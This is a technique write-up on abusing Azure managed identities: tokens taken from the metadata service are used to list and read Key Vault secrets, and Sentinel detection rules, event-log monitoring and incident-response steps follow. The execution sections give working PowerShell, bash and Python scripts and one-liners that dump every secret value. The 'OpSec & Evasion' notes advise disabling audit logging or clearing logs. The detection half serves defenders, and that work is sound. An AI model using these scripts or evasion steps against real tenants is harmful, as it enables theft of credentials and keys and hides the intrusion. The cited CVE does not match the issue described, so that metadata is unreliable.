# [PE-DISCOVER-001]: Azure Key Vault Managed Identity Discovery

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-DISCOVER-001 |
| **MITRE ATT&CK v18.1** | [T1580 - Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580/) |
| **Tactic** | Privilege Escalation / Discovery |
| **Platforms** | Entra ID (Azure) |
| **Severity** | High |
| **CVE** | CVE-2023-28432 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Azure Stack versions, Azure Services 2019-2026 |
| **Patched In** | N/A (Design issue, not a patched vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Managed Identities provide passwordless authentication for Azure resources, but they expose a critical security boundary: the Instance Metadata Service (IMDS) endpoint at `169.254.169.254` is accessible to any process running on the resource. An attacker with code execution on a resource with an attached managed identity can request access tokens from the IMDS endpoint without authentication. These tokens can be used to enumerate and access Key Vault secrets, certificates, and keys that the managed identity has been granted permissions to. This discovery technique allows an attacker to map the permissions and sensitive data accessible to the compromised identity, effectively escalating from code execution to data breach.

**Attack Surface:** Azure Instance Metadata Service (IMDS) endpoint, managed identity token endpoint, Azure Key Vault REST API, Microsoft Graph API.

**Business Impact:** **Critical data exposure and lateral movement enabler**. Once a managed identity's permissions are enumerated, attackers can access sensitive secrets (database credentials, API keys, encryption keys), certificates (for code signing, authentication), and keys (cryptographic material). This can lead to unauthorized data access, privilege escalation across subscriptions, and lateral movement to other Azure resources.

**Technical Context:** The attack typically takes **seconds to minutes** to execute. Detection is difficult because IMDS requests appear as normal service-to-service communication. Indicators of compromise include unusual token requests to the metadata service and subsequent Azure Key Vault enumeration operations from unexpected IP addresses or at unusual times.

### Operational Risk

- **Execution Risk:** Medium (Requires code execution on Azure resource, but IMDS endpoint is unauthenticated)
- **Stealth:** High (IMDS traffic and Key Vault API calls blend with legitimate service traffic; minimal event log generation on the resource itself)
- **Reversibility:** No (Data exfiltration is permanent once secrets are accessed; cannot be undone without rotation)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.4 | Restrict Azure Services access to specific resource groups and subscriptions |
| **DISA STIG** | AC-2(1) | Automated account/credential management for service identities |
| **CISA SCuBA** | SI-7(1) | Cryptographic controls for API secrets and tokens |
| **NIST 800-53** | AC-3 (Access Enforcement), AC-6 (Least Privilege), SC-7 (Boundary Protection) |
| **GDPR** | Art. 32 (Security of Processing), Art. 33 (Breach Notification) |
| **DORA** | Art. 9 (Protection and Prevention), Art. 10 (Incident Detection) |
| **NIS2** | Art. 21 (Cyber Risk Management Measures), Art. 23.1(f) (Monitoring and Detection) |
| **ISO 27001** | A.9.2.1 (User Registration), A.9.2.3 (Management of Privileged Access Rights), A.9.4.3 (Password Management) |
| **ISO 27005** | Risk Scenario: "Compromise of Privileged Service Accounts via Metadata Exposure" |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Code execution on Azure resource (VM, App Service, Function, Container Instance, etc.) with attached managed identity
- **Required Access:** Network connectivity to IMDS endpoint (`169.254.169.254:80`) from within the Azure resource; outbound HTTPS to Azure authentication services

**Supported Versions:**
- **Azure Services:** All versions supporting managed identities (2019-2026)
- **Operating Systems:** Windows Server 2016+ (via PowerShell 5.0+), Ubuntu 18.04+, CentOS 7+, any Linux with curl/wget
- **Runtimes:** Python 3.6+, Node.js 10+, Java 8+, .NET Framework 4.5+

**Tools (Optional):**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) (Version 2.0+)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/install-azps-windows) (Az Module 5.0+)
- [Azure SDK for Python](https://github.com/Azure/azure-sdk-for-python) (1.0+)
- curl / wget (Pre-installed on most systems)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Azure Portal Reconnaissance

**Step 1: Identify Managed Identities**

Navigate to **Azure Portal → Entra ID → Enterprise Applications** and filter for "Managed Identities":

1. Go to [Azure Portal](https://portal.azure.com)
2. Click **Microsoft Entra ID** in the left sidebar
3. Select **Enterprise applications**
4. In the "Application type" dropdown, select **Managed Identities**
5. Review the list of managed identities and their associated resources

**What to Look For:**
- Which resources (VMs, App Services, Functions) have managed identities attached
- The service principal names (e.g., "my-vm", "my-function-app")
- Note any suspicious or overprivileged identities

**Step 2: Check Managed Identity Permissions**

1. Click on a managed identity from the list
2. Select **Roles and administrators** or navigate to the resource's **Access Control (IAM)**
3. Review role assignments to determine what resources the identity can access
4. Note any Owner, Contributor, or custom roles with broad permissions

**What to Look For:**
- Identities with subscription-level or resource group-level permissions
- Access to Key Vaults, storage accounts, databases, or other sensitive resources
- Custom roles with broad permissions (e.g., `*/read`, `*/write`)

### PowerShell Reconnaissance (From Management Station)

```powershell
# Connect to Azure
Connect-AzAccount

# List all managed identities in the subscription
Get-AzADServicePrincipal -Filter "startswith(displayName, 'msi_')" | Select-Object DisplayName, Id, ServicePrincipalNames

# Get role assignments for a specific managed identity
$principalId = "12345678-1234-1234-1234-123456789012"  # Replace with actual principal ID
Get-AzRoleAssignment -ObjectId $principalId | Select-Object RoleDefinitionName, Scope

# List all resources with system-assigned managed identities
Get-AzVM | Where-Object {$_.Identity.PrincipalId -ne $null} | Select-Object Name, ResourceGroupName, @{Name="ManagedIdentityId"; Expression={$_.Identity.PrincipalId}}

# List all App Service resources with managed identities
Get-AzWebApp | Where-Object {$_.Identity.PrincipalId -ne $null} | Select-Object Name, ResourceGroupName, @{Name="ManagedIdentityId"; Expression={$_.Identity.PrincipalId}}

# List all Function Apps with managed identities
Get-AzFunctionApp | Where-Object {$_.Identity.PrincipalId -ne $null} | Select-Object Name, ResourceGroupName, @{Name="ManagedIdentityId"; Expression={$_.Identity.PrincipalId}}
```

**What This Means:**
- Each result represents a potential attack vector if the resource is compromised
- Identities with Contributor or Owner roles at subscription level are high-value targets
- Identities with Key Vault access (Key Vault Contributor, Key Vault Secrets User, etc.) are particularly valuable

### Azure CLI Reconnaissance

```bash
# Login to Azure
az login

# List all managed identities in a resource group
az identity list --resource-group "your-resource-group" --output table

# Get detailed information about a specific managed identity
az identity show --name "your-identity-name" --resource-group "your-resource-group"

# List role assignments for a managed identity
az role assignment list --assignee "your-principal-id" --output table

# List all VMs with managed identities
az vm list --query "[?identity != null].[name, resourceGroup, identity.principalId]" --output table
```

**Version Note:** Commands work consistently across all Azure CLI versions 2.0+ with no breaking changes.

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: PowerShell-Based Discovery (Windows Environment)

**Supported Versions:** Windows Server 2016+ with PowerShell 5.0+, Windows 10/11

#### Step 1: Acquire Managed Identity Token via IMDS

**Objective:** Request an access token from the Instance Metadata Service using the managed identity attached to the current resource.

**Command:**

```powershell
# Define the IMDS endpoint
$imdsEndpoint = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net"

# Add required headers
$headers = @{"Metadata" = "true"}

# Request token from IMDS
$response = Invoke-WebRequest -Uri $imdsEndpoint -Headers $headers -UseBasicParsing
$token = ($response.Content | ConvertFrom-Json).access_token

Write-Host "[+] Token acquired: $($token.Substring(0, 50))..."
```

**Expected Output:**

```
[+] Token acquired: eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAiLCJ0eXAiOiJKV1QifQ...
```

**What This Means:**
- The token is a JSON Web Token (JWT) containing the managed identity's claims
- The token is valid for approximately 1 hour by default
- The token's audience (`resource=https://vault.azure.net`) determines what service it can be used with

**OpSec & Evasion:**
- IMDS requests appear as normal traffic; no process creation or elevated privileges required
- Requests to 169.254.169.254 from unusual processes (PowerShell, Python) may be detected by endpoint solutions
- **Detection likelihood:** Medium (depends on network monitoring and process behavior analysis)

**Troubleshooting:**
- **Error:** `Invoke-WebRequest: The remote server returned an error: (401) Unauthorized`
  - **Cause:** No managed identity attached to the resource, or metadata service is blocked
  - **Fix (All Versions):** Verify the resource has a managed identity attached via Azure Portal → Resource → Identity

#### Step 2: Enumerate Azure Key Vault Secrets

**Objective:** Use the acquired token to list and retrieve secrets stored in Azure Key Vaults that the managed identity has access to.

**Command:**

```powershell
# Define Key Vault URL (replace with actual vault name)
$vaultName = "my-key-vault"
$vaultUri = "https://${vaultName}.vault.azure.net"

# Define headers with the token
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type"  = "application/json"
}

# List all secrets in the Key Vault
$secretsUri = "$vaultUri/secrets?api-version=2019-09-01"
$secretsResponse = Invoke-WebRequest -Uri $secretsUri -Headers $headers -UseBasicParsing
$secrets = ($secretsResponse.Content | ConvertFrom-Json).value

Write-Host "[+] Found $($secrets.Count) secrets:"
foreach ($secret in $secrets) {
    Write-Host "  - $($secret.id)"
}
```

**Expected Output:**

```
[+] Found 5 secrets:
  - https://my-key-vault.vault.azure.net/secrets/DatabasePassword
  - https://my-key-vault.vault.azure.net/secrets/APIKey
  - https://my-key-vault.vault.azure.net/secrets/EncryptionKey
  - https://my-key-vault.vault.azure.net/secrets/CertificatePassword
  - https://my-key-vault.vault.azure.net/secrets/ConnectionString
```

**What This Means:**
- Each secret URL can be queried to retrieve the actual secret value
- The presence of these secrets indicates potential lateral movement or data access opportunities
- Secrets with names like "Password", "Key", "APIKey", "ConnectionString" are high-value targets

**OpSec & Evasion:**
- REST API calls to Key Vault are logged in Azure Audit Logs; ensure audit logging is disabled or logs are cleared (see Defense Evasion section)
- Access from unexpected identities or IP addresses may trigger Microsoft Defender alerts
- **Detection likelihood:** High (if audit logging is enabled and monitored)

**Troubleshooting:**
- **Error:** `Response status code does not indicate success: 403 (Forbidden)`
  - **Cause:** Token is invalid, or the managed identity lacks permission to list secrets
  - **Fix (All Versions):** Verify the managed identity has "Key Vault Secrets User" or "Key Vault Contributor" role assigned via Azure Portal → Key Vault → Access Control (IAM)

#### Step 3: Retrieve Secret Values

**Objective:** Extract the actual values of secrets for use in lateral movement or data exfiltration.

**Command:**

```powershell
# Define the secret URL
$secretName = "DatabasePassword"
$secretUri = "$vaultUri/secrets/$secretName?api-version=2019-09-01"

# Retrieve the secret value
$secretResponse = Invoke-WebRequest -Uri $secretUri -Headers $headers -UseBasicParsing
$secretValue = ($secretResponse.Content | ConvertFrom-Json).value

Write-Host "[+] Secret '$secretName' value: $secretValue"

# Enumerate all secrets in a loop
foreach ($secret in $secrets) {
    $secretName = $secret.id.Split('/')[-1]
    $secretUri = "$($secret.id)?api-version=2019-09-01"
    $secretResponse = Invoke-WebRequest -Uri $secretUri -Headers $headers -UseBasicParsing
    $secretValue = ($secretResponse.Content | ConvertFrom-Json).value
    Write-Host "[+] Secret '$secretName' value: $secretValue"
}
```

**Expected Output:**

```
[+] Secret 'DatabasePassword' value: P@ssw0rd123!
[+] Secret 'APIKey' value: sk_live_abcdef1234567890
[+] Secret 'EncryptionKey' value: AES256KeyMaterial...
[+] Secret 'CertificatePassword' value: CertPass123
[+] Secret 'ConnectionString' value: Server=db.windows.net;User=admin;Password=...
```

**What This Means:**
- These secrets can be used to authenticate to other Azure services or on-premises systems
- Database credentials may grant access to SQL databases and data
- API keys may grant access to external services or internal APIs
- Encryption keys may allow decryption of sensitive data

**OpSec & Evasion:**
- Each secret retrieval generates an audit log entry in the Key Vault's diagnostic logs
- The access pattern (listing then retrieving all secrets) is suspicious and may trigger alerts
- **Detection likelihood:** High

---

### METHOD 2: Bash/curl-Based Discovery (Linux/macOS Environment)

**Supported Versions:** Ubuntu 18.04+, CentOS 7+, macOS 10.14+, any Linux with curl

#### Step 1: Acquire Managed Identity Token via IMDS

**Objective:** Request an access token from IMDS using curl.

**Command:**

```bash
#!/bin/bash

# Define IMDS endpoint
IMDS_ENDPOINT="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net"

# Request token (Metadata header is required)
TOKEN=$(curl -s -H "Metadata:true" "$IMDS_ENDPOINT" | jq -r '.access_token')

echo "[+] Token acquired: ${TOKEN:0:50}..."
```

**Expected Output:**

```
[+] Token acquired: eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAiLCJ0eXAiOiJKV1QifQ...
```

**What This Means:**
- curl is commonly available on Linux systems; no additional tools required
- The token can be used for subsequent API calls

**OpSec & Evasion:**
- curl requests to 169.254.169.254 may be monitored by host-based IDS/IPS
- Process creation logs will show curl process; less suspicious than PowerShell but still potentially detectable
- **Detection likelihood:** Medium

#### Step 2: Enumerate Azure Key Vault Secrets

**Objective:** Use the token to list secrets via the REST API.

**Command:**

```bash
#!/bin/bash

# Key Vault details
VAULT_NAME="my-key-vault"
VAULT_URI="https://${VAULT_NAME}.vault.azure.net"

# List secrets
SECRETS_URI="${VAULT_URI}/secrets?api-version=2019-09-01"

curl -s -H "Authorization: Bearer $TOKEN" "$SECRETS_URI" | jq '.value[] | .id' | while read -r SECRET_ID; do
    SECRET_NAME=$(echo "$SECRET_ID" | rev | cut -d'/' -f1 | rev)
    echo "[+] Found secret: $SECRET_NAME"
done
```

**Expected Output:**

```
[+] Found secret: DatabasePassword
[+] Found secret: APIKey
[+] Found secret: EncryptionKey
[+] Found secret: CertificatePassword
[+] Found secret: ConnectionString
```

**What This Means:**
- Secret enumeration is complete; next step is value retrieval

**OpSec & Evasion:**
- Piping output through jq may generate additional process logs
- Using variables to store sensitive data in memory is preferable to command-line arguments
- **Detection likelihood:** High (if logging and monitoring enabled)

#### Step 3: Retrieve Secret Values

**Objective:** Extract actual secret values.

**Command:**

```bash
#!/bin/bash

# Retrieve all secrets
curl -s -H "Authorization: Bearer $TOKEN" "$SECRETS_URI" | jq -r '.value[] | .id' | while read -r SECRET_ID; do
    SECRET_NAME=$(echo "$SECRET_ID" | rev | cut -d'/' -f1 | rev)
    SECRET_VALUE=$(curl -s -H "Authorization: Bearer $TOKEN" "${SECRET_ID}?api-version=2019-09-01" | jq -r '.value')
    echo "[+] Secret '$SECRET_NAME': $SECRET_VALUE"
done
```

**Expected Output:**

```
[+] Secret 'DatabasePassword': P@ssw0rd123!
[+] Secret 'APIKey': sk_live_abcdef1234567890
[+] Secret 'EncryptionKey': AES256KeyMaterial...
[+] Secret 'CertificatePassword': CertPass123
[+] Secret 'ConnectionString': Server=db.windows.net;User=admin;Password=...
```

**What This Means:**
- Secrets are now available for lateral movement or exfiltration

**OpSec & Evasion:**
- Each curl request generates network traffic that may be captured by network IDS
- **Detection likelihood:** High

---

### METHOD 3: Python-Based Discovery (Cross-Platform)

**Supported Versions:** Python 3.6+, works on Windows, Linux, macOS

#### Step 1: Acquire Token and Enumerate Secrets

**Objective:** Use Python with the Azure Identity SDK for streamlined token acquisition and Key Vault enumeration.

**Code:**

```python
#!/usr/bin/env python3

import requests
import json
import sys
from azure.identity import DefaultAzureCredential
from azure.keyvault.secrets import SecretClient

try:
    # Method 1: Using Azure SDK (automatic token management)
    credential = DefaultAzureCredential()
    vault_url = "https://my-key-vault.vault.azure.net/"
    client = SecretClient(vault_url=vault_url, credential=credential)
    
    print("[+] Listing Key Vault secrets...")
    for secret in client.list_properties_of_secrets():
        print(f"  - {secret.name}")
        try:
            # Retrieve secret value
            secret_value = client.get_secret(secret.name)
            print(f"    Value: {secret_value.value}")
        except Exception as e:
            print(f"    Error retrieving: {e}")
            
except ImportError:
    # Method 2: Using direct IMDS endpoint (no SDK required)
    print("[+] Azure SDK not available; using IMDS endpoint directly...")
    
    import urllib.request
    import json
    
    # Request token from IMDS
    imds_url = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net"
    headers = {"Metadata": "true"}
    
    req = urllib.request.Request(imds_url, headers=headers)
    with urllib.request.urlopen(req) as response:
        data = json.loads(response.read().decode('utf-8'))
        token = data['access_token']
    
    print(f"[+] Token acquired: {token[:50]}...")
    
    # List secrets
    vault_name = "my-key-vault"
    secrets_url = f"https://{vault_name}.vault.azure.net/secrets?api-version=2019-09-01"
    headers = {"Authorization": f"Bearer {token}"}
    
    req = urllib.request.Request(secrets_url, headers=headers)
    with urllib.request.urlopen(req) as response:
        secrets_data = json.loads(response.read().decode('utf-8'))
        
    print("[+] Secrets found:")
    for secret in secrets_data.get('value', []):
        secret_name = secret['id'].split('/')[-1]
        print(f"  - {secret_name}")
        
        # Retrieve value
        secret_url = f"{secret['id']}?api-version=2019-09-01"
        req = urllib.request.Request(secret_url, headers=headers)
        with urllib.request.urlopen(req) as response:
            secret_data = json.loads(response.read().decode('utf-8'))
            print(f"    Value: {secret_data.get('value', 'N/A')}")

except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit(1)
```

**Expected Output:**

```
[+] Listing Key Vault secrets...
  - DatabasePassword
    Value: P@ssw0rd123!
  - APIKey
    Value: sk_live_abcdef1234567890
  - EncryptionKey
    Value: AES256KeyMaterial...
```

**What This Means:**
- Python script can be executed as part of application code without suspicion
- Azure SDK handles token management automatically

**OpSec & Evasion:**
- Python execution from within an application is less suspicious than manual script execution
- Use `DefaultAzureCredential` which automatically uses the managed identity without explicit token handling
- **Detection likelihood:** Medium (if process monitoring enabled)

---

## 5. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

**Atomic Test ID:** N/A (T1580 is a discovery technique; Atomic Red Team primarily focuses on exploitation/impact techniques)

**Alternative Verification:**

Atomic Red Team does not include a specific test for Azure Key Vault Managed Identity Discovery. However, the technique aligns with the **T1580 - Cloud Infrastructure Discovery** tactic. Organizations can simulate this attack using:

1. **Legitimate Azure CLI commands:**

```bash
# Discovery simulation
az keyvault list --query "[].name"
az keyvault secret list --vault-name "my-key-vault"
```

2. **Managed Identity testing in Azure security labs** (use Azure's built-in "Managed Identity" role assignments as the starting point)

---

## 6. TOOLS & COMMANDS REFERENCE

### Azure CLI

**Version:** 2.0+
**Minimum Version:** 2.0
**Supported Platforms:** Windows, macOS, Linux

**Installation:**

```bash
# Windows (via Chocolatey)
choco install azure-cli

# macOS (via Homebrew)
brew install azure-cli

# Linux (via apt)
curl -sL https://aka.ms/InstallAzureCLIDeb | bash
```

**Usage:**

```bash
# Login with managed identity (from within Azure resource)
az login --identity

# List Key Vaults accessible to the current identity
az keyvault list --query "[].name" -o table

# List secrets in a Key Vault
az keyvault secret list --vault-name "my-key-vault" --query "[].name" -o table

# Retrieve a secret value
az keyvault secret show --vault-name "my-key-vault" --name "DatabasePassword" --query "value" -o tsv
```

### Azure PowerShell Module (Az)

**Version:** 5.0+
**Minimum Version:** 5.0
**Supported Platforms:** Windows, macOS, Linux (with PowerShell Core 7+)

**Installation:**

```powershell
# Install the latest version
Install-Module -Name Az -AllowClobber -Force

# Update existing installation
Update-Module -Name Az
```

**Usage:**

```powershell
# Connect with managed identity
Connect-AzAccount -Identity

# List Key Vaults
Get-AzKeyVault | Select-Object VaultName, ResourceGroupName

# List secrets in a Key Vault
Get-AzKeyVaultSecret -VaultName "my-key-vault" | Select-Object Name

# Get secret value
$secret = Get-AzKeyVaultSecret -VaultName "my-key-vault" -Name "DatabasePassword"
$secret.SecretValue | ConvertFrom-SecureString -AsPlainText
```

### BARK (Blue Atop Red King)

**Repository:** [https://github.com/BloodHoundAD/BARK](https://github.com/BloodHoundAD/BARK)

**Version:** Latest
**Supported Platforms:** Windows PowerShell 5.0+

**Usage:**

```powershell
# Import BARK module
. .\BARK.ps1

# Get token for Key Vault
$KeyVaultToken = Get-AzureKeyVaultTokenWithUsernamePassword -Username "user@company.com" -Password "password"

# Enumerate Key Vaults
Get-AzureKeyVaults -Token $KeyVaultToken

# Retrieve secrets
Get-AzureKeyVaultSecrets -VaultName "my-key-vault" -Token $KeyVaultToken
```

### One-Liner Execution

**PowerShell (Windows):**

```powershell
$token = (Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net" -Headers @{"Metadata"="true"} -UseBasicParsing).Content | ConvertFrom-Json | Select-Object -ExpandProperty access_token; (Invoke-WebRequest -Uri "https://my-key-vault.vault.azure.net/secrets?api-version=2019-09-01" -Headers @{"Authorization"="Bearer $token"} -UseBasicParsing).Content | ConvertFrom-Json | Select-Object -ExpandProperty value | ForEach-Object { $secretName = $_.id.Split('/')[-1]; $secretValue = (Invoke-WebRequest -Uri "$($_.id)?api-version=2019-09-01" -Headers @{"Authorization"="Bearer $token"} -UseBasicParsing).Content | ConvertFrom-Json | Select-Object -ExpandProperty value; Write-Host "[+] $secretName : $secretValue" }
```

**Bash (Linux/macOS):**

```bash
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net" | jq -r '.access_token' | xargs -I {} sh -c 'curl -s -H "Authorization: Bearer {}" "https://my-key-vault.vault.azure.net/secrets?api-version=2019-09-01" | jq -r ".value[] | .id" | while read SECRET_ID; do curl -s -H "Authorization: Bearer {}" "${SECRET_ID}?api-version=2019-09-01" | jq -r ".value"; done'
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Rule 1: Suspicious Managed Identity Token Requests from Unusual Process

**Rule Configuration:**
- **Required Table:** AADManagedIdentitySignInLogs, AzureActivity
- **Required Fields:** ServicePrincipalId, ResourceDisplayName, IPAddress, UserAgent, ProcessName
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** All Azure AD / Entra ID versions

**KQL Query:**

```kusto
// Detect suspicious token requests from managed identities
AADManagedIdentitySignInLogs
| where TimeGenerated > ago(24h)
| where ResourceDisplayName contains "vault.azure.net" or ResourceDisplayName contains "keyvault"
| where IPAddress == "169.254.169.254" or IPAddress == "127.0.0.1" or IPAddress startswith "10."
| summarize RequestCount = count() by ServicePrincipalId, ServicePrincipalName, ResourceDisplayName, IPAddress, TimeGenerated = bin(TimeGenerated, 5m)
| where RequestCount > 5  // Threshold: more than 5 requests in 5 minutes
| project ServicePrincipalName, ResourceDisplayName, RequestCount, IPAddress, TimeGenerated
```

**What This Detects:**
- Multiple token requests from a managed identity in a short timeframe (potential enumeration)
- Access to Key Vault resources from the IMDS endpoint (169.254.169.254)
- Unusual patterns: legitimate services typically cache tokens and don't request multiple times

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal → Microsoft Sentinel**
2. Select your **Workspace**
3. Go to **Analytics → Create → Scheduled query rule**
4. **General Tab:**
   - Name: "Suspicious Managed Identity Key Vault Token Requests"
   - Severity: High
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every **5 minutes**
   - Lookup data from the last **1 hour**
6. **Incident settings Tab:**
   - Enable: "Create incidents from alerts triggered by this analytic rule"
   - Grouping: By ServicePrincipalName
7. **Click Review + create**

---

### Rule 2: Key Vault Enumeration via Managed Identity

**Rule Configuration:**
- **Required Table:** AzureDiagnostics (Key Vault Audit)
- **Required Fields:** OperationName, CallerIPAddress, identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g, ResultType
- **Alert Severity:** Medium
- **Frequency:** Every 10 minutes
- **Applies To Versions:** All Key Vault versions with diagnostic logging enabled

**KQL Query:**

```kusto
// Detect enumeration of Key Vault secrets by managed identity
AzureDiagnostics
| where TimeGenerated > ago(24h)
| where ResourceType == "VAULTS"
| where OperationName in ("SecretList", "SecretGet", "SecretGetVersions", "KeyList", "KeyGet")
| where identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g != ""
| summarize EnumerationCount = count() by identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g, OperationName, ResourceName, CallerIPAddress, TimeGenerated = bin(TimeGenerated, 10m)
| where EnumerationCount > 10  // Threshold: more than 10 enumeration operations in 10 minutes
| project EnumerationCount, OperationName, ResourceName, CallerIPAddress, TimeGenerated
```

**What This Detects:**
- Bulk secret enumeration (ListSecrets followed by GetSecret calls)
- Multiple Key Vault operations from the same managed identity in short timeframes
- Access patterns inconsistent with normal application behavior

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Microsoft Sentinel → Analytics → Create → Scheduled query rule**
2. **General Tab:**
   - Name: "Key Vault Secret Enumeration by Managed Identity"
   - Severity: Medium
3. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every **10 minutes**
   - Lookup data from the last **2 hours**
4. **Incident settings Tab:**
   - Enable: "Create incidents from alerts"
   - Grouping: By ResourceName
5. **Actions Tab (Playbook Integration):**
   - Optionally add a playbook to revoke managed identity token or isolate resource
6. **Click Review + create**

---

### Rule 3: Unusual Azure Key Vault Access from Entra ID Sign-in

**Rule Configuration:**
- **Required Table:** SigninLogs, AzureDiagnostics (Key Vault)
- **Required Fields:** UserPrincipalName, ServicePrincipalName, ResourceId, TimeGenerated
- **Alert Severity:** Medium
- **Frequency:** Every 15 minutes
- **Applies To Versions:** All Entra ID versions with audit logging

**KQL Query:**

```kusto
// Detect Key Vault access preceded by unusual sign-in patterns
let KeyVaultAccess = AzureDiagnostics
| where TimeGenerated > ago(24h)
| where ResourceType == "VAULTS" and OperationName in ("SecretList", "SecretGet")
| project ResourceName, identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g, TimeGenerated, AccessTime = TimeGenerated;

let UnusualSignIns = SigninLogs
| where TimeGenerated > ago(24h)
| where ResourceIdentity contains "vault.azure.net" or ResourceDisplayName contains "Key Vault"
| where Status.errorCode != 0  // Failed sign-in attempts before successful access
| project ServicePrincipalId, TimeGenerated, FailureReason = Status.failureReason;

KeyVaultAccess
| join kind=inner (UnusualSignIns) on ServicePrincipalId == identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g
| where datetime_diff('minute', AccessTime, TimeGenerated) < 10  // Access within 10 minutes of sign-in
| project ResourceName, AccessTime, FailureReason
```

**What This Detects:**
- Failed authentication attempts followed by successful Key Vault access (indicator of token theft)
- Access patterns following suspicious sign-in events
- Anomalous timing between authentication and resource access

---

## 8. WINDOWS EVENT LOG MONITORING

### Event ID: 4688 (Process Creation)

**Log Source:** Security log

**Trigger:** Any process creation related to Azure authentication or Key Vault access (PowerShell.exe, curl.exe, python.exe making HTTP requests to 169.254.169.254 or vault.azure.net)

**Filter (PowerShell audit policy):**

```powershell
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4688
    Data = '*169.254.169.254*', '*/metadata/identity/*', '*vault.azure.net*'
}
```

**Applies To Versions:** Windows Server 2016+

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console (gpmc.msc)**
2. Navigate to: **Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → System Audit Policies → Object Access**
3. Enable: **Audit Process Creation** (Success and Failure)
4. Run **gpupdate /force** on target machines

**What to Look For:**
- Process 4688 events where CommandLine contains "169.254.169.254", "metadata", or "vault.azure.net"
- Processes like PowerShell, cmd, curl, python making outbound network connections
- Unusual processes (not typical application runtimes) making IMDS requests

---

### Event ID: 5156 (Network Connection Allowed)

**Log Source:** Security log (requires Windows Firewall with Advanced Security audit policy)

**Trigger:** Network connections to 169.254.169.254:80 (IMDS endpoint)

**Filter:**

```powershell
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 5156
    Data = '*169.254.169.254*', '*80*'
}
```

**Applies To Versions:** Windows Server 2016+ (with Windows Firewall for Advanced Security enabled)

**Manual Configuration Steps (Local Security Policy):**

1. Open **Local Security Policy (secpol.msc)**
2. Navigate to: **Security Settings → Advanced Audit Policy Configuration → System Audit Policies → System**
3. Enable: **Audit Filtering Platform Connection** (Success and Failure)
4. Run **auditpol /set /subcategory:"Filtering Platform Connection" /success:enable /failure:enable**

**What to Look For:**
- 5156 events where destination IP is 169.254.169.254 and destination port is 80
- Source processes: PowerShell, cmd, curl, Python, Java, .NET runtimes
- Unusual timing or frequency (legitimate services cache tokens)

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network IOCs:**
- Traffic to 169.254.169.254:80 from processes other than standard Azure agents
- HTTPS traffic to `*.vault.azure.net` from managed identities with historical absence of such access
- Rapid sequential connections to multiple Azure services (lateral movement pattern)

**Log IOCs:**
- AADManagedIdentitySignInLogs with resource "vault.azure.net" from IP 127.0.0.1 or 10.x.x.x
- AzureDiagnostics with OperationName "SecretList" or "SecretGet" executed by managed identity
- SigninLogs showing failed authentication attempts followed by successful Key Vault access within minutes

**Forensic Artifacts:**
- **Disk:** Azure SDK cache files in `C:\Users\<user>\.azure\` (Windows) or `~/.azure/` (Linux)
- **Memory:** IMDS tokens in process memory; can be dumped with tools like procdump
- **Cloud Logs:** AzureActivity logs showing KeyVault operations; Key Vault audit logs showing SecretList and SecretGet operations

### Response Procedures

**Phase 1: Isolate**

```powershell
# Disable managed identity on the compromised resource
$resourceId = "/subscriptions/sub-id/resourceGroups/rg-name/providers/Microsoft.Compute/virtualMachines/vm-name"
Update-AzVM -ResourceId $resourceId -IdentityType None -Force
```

**Manual Azure Portal Steps:**
1. Navigate to **Virtual Machines** (or applicable resource)
2. Select the compromised resource
3. Go to **Identity** tab
4. Set **Status** to **Off**
5. Click **Save**

**Phase 2: Collect Evidence**

```powershell
# Export Key Vault audit logs
$logs = Get-AzDiagnosticSetting -ResourceId "/subscriptions/sub-id/resourceGroups/rg-name/providers/Microsoft.KeyVault/vaults/vault-name"
$logs | Export-AzureDiagnosticLog -OutputPath "C:\Incident\KeyVault_Audit.log"

# Export Azure Activity logs
Search-AzActivity -StartTime (Get-Date).AddDays(-7) -EndTime (Get-Date) | Where-Object {$_.ResourceType -eq "Microsoft.KeyVault"} | Export-Csv -Path "C:\Incident\Azure_Activity.csv"

# Export AAD sign-in logs
Connect-MgGraph -Scopes "AuditLog.Read.All"
$logs = Get-MgAuditLogSignIn -Filter "resourceId eq 'vault.azure.net'" -All
